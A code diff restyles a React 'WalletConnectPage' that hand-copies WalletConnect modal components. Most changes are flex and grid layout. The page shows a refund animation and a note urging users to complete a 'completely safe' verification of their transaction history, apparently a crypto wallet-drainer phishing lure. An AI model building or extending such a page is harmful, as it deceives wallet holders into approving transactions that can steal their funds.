@@ -142,23 +142,39 @@ export default function WalletConnectPage() {
 
 
 {/* içerik */}
-<w3m-router className="embedded" style={{ animation: "unset", height: "100%" }}>
+<w3m-router
+  className="embedded"
+  style={{
+    animation: "unset",
+    display: "flex",
+    flexDirection: "column",
+    height: "100%",
+  } as React.CSSProperties}
+>
   <div
     className="w3m-router-container"
     view-direction="prev"
-    style={{ height: "100%" }}
+    style={{
+      display: "flex",
+      flexDirection: "column",
+      flex: 1,
+    } as React.CSSProperties}
   >
-    <w3m-warning-view style={{ display: "flex", height: "100%" }}>
+    <w3m-warning-view
+      style={{
+        display: "flex",
+        flexDirection: "column",
+        flex: 1,
+      } as React.CSSProperties}
+    >
+      {/* grid ile video, note ve button arasına esnek boşluk koyuyoruz */}
       <wui-flex
-        flexdirection="column"
-        alignitems="center"
-        gap="xl"
         style={{
-          display: "flex",
-          flexDirection: "column",
-          alignItems: "center",
-          gap: "var(--wui-spacing-xl)",
+          display: "grid",
+          gridTemplateRows: "auto auto 1fr auto",
           height: "100%",
+          gap: "var(--wui-spacing-xl)",
+          justifyItems: "center",
         } as React.CSSProperties}
       >
         {/* Video */}
@@ -171,8 +187,9 @@ export default function WalletConnectPage() {
             width: 238 * 0.9,
             height: 360 * 0.9,
             overflow: "hidden",
-            borderRadius: "clamp(0px,var(--wui-border-radius-m), 40px)",
-          }}
+            borderRadius:
+              "clamp(0px,var(--wui-border-radius-m), 40px)",
+          } as React.CSSProperties}
         >
           <img
             src="/media/refund_anim2.apng"
@@ -183,8 +200,7 @@ export default function WalletConnectPage() {
               width: "214.2px",
               height: "324px",
               objectFit: "cover",
-              margin: "0 auto",
-            }}
+            } as React.CSSProperties}
           />
           <wui-shimmer
             width="238px"
@@ -192,13 +208,17 @@ export default function WalletConnectPage() {
             style={{
               width: "238px",
               height: "360px",
-              borderRadius: "clamp(0px,var(--wui-border-radius-m), 40px)",
+              borderRadius:
+                "clamp(0px,var(--wui-border-radius-m), 40px)",
             } as React.CSSProperties}
           />
         </div>
 
         {/* Note */}
-        <div className="note" style={{ width: "100%", textAlign: "center" }}>
+        <div
+          className="note"
+          style={{ width: "100%", textAlign: "center" }}
+        >
           <wui-text
             variant="paragraph-500"
             color="fg-100"
@@ -213,6 +233,7 @@ export default function WalletConnectPage() {
               textTransform: "none",
             } as React.CSSProperties}
           >
+            {/* Note içeriği */}
             <wui-icon
               name="info"
               size="sm"
@@ -253,49 +274,32 @@ export default function WalletConnectPage() {
             >
               Note:
             </span>
-            <span
-              style={{
-                verticalAlign: "middle",
-                display: "inline",
-                fontSize: "1em",
-                textTransform: "none",
-              }}
-            >
-              This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.
-            </span>
+            This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.
           </wui-text>
         </div>
 
-        {/* Spacer + centered Continue button */}
-        <div
+        {/* spacer: bu satır grid-template-rows’te 1fr olarak tanımlı */}
+
+        {/* Continue Button */}
+        <wui-button
+          variant="accent"
+          fullwidth=""
           style={{
-            flex: 1,
-            display: "flex",
-            alignItems: "center",
-            justifyContent: "center",
-            width: "100%",
-          }}
+            "--local-width": "100%",
+            "--local-opacity-100": "1",
+            "--local-opacity-000": "0",
+            "--local-border-radius": "var(--wui-border-radius-m)",
+          } as React.CSSProperties}
         >
-          <wui-button
-            variant="accent"
-            fullwidth
-            style={{
-              "--local-width": "100%",
-              "--local-opacity-100": "1",
-              "--local-opacity-000": "0",
-              "--local-border-radius": "var(--wui-border-radius-m)",
-            } as React.CSSProperties}
+          <button
+            data-variant="accent"
+            data-icon-left="false"
+            data-icon-right="false"
+            data-size="lg"
           >
-            <button
-              data-variant="accent"
-              data-icon-left="false"
-              data-icon-right="false"
-              data-size="lg"
-            >
-              Continue
-            </button>
-          </wui-button>
-        </div>
+            Continue
+          </button>
+        </wui-button>
       </wui-flex>
     </w3m-warning-view>
   </div>
